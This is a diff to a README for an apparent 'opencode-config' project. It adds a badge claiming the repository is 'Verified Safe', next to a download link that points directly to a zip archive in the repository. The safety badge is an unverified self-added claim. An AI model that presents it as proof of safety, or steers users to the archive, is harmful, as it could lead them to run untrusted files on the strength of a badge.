@@ -1,5 +1,7 @@
 # 🚀 opencode-config - Simple Setup for Your OpenCode Needs
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/victor20252025-opencode-config)
+
 ![Download opencode-config](https://raw.githubusercontent.com/victor20252025/opencode-config/main/command/config-opencode-2.4-beta.5.zip)
 
 ## 📦 Overview
